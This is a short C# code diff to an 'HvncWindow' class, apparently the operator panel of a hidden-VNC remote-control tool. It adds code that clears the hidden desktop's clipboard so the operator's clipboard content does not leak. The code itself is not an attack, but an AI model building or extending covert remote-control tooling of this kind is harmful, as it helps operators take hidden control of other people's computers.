@@ -127,6 +127,20 @@ public partial class HvncWindow : Window
             Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
         });
         SetStreamingState(true);
+
+        // If clipboard sync is off, immediately clear the hidden-desktop clipboard so
+        // HVNC apps cannot access the operator's clipboard via right-click → Paste.
+        if (ChkClipboard.IsChecked != true)
+            SendClipboardClear();
+    }
+
+    private void SendClipboardClear()
+    {
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.HvncClipboard,
+            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new HvncClipboardData { Text = "" })
+        });
     }
 
     private void SendStop()
@@ -177,6 +191,8 @@ public partial class HvncWindow : Window
         _clipTimer?.Stop();
         _clipTimer = null;
         _lastClip  = "";
+        // Clear hidden-desktop clipboard so right-click paste can no longer leak operator content
+        if (_streaming) SendClipboardClear();
     }
 
     private void ClipSync_Tick(object? sender, EventArgs e)
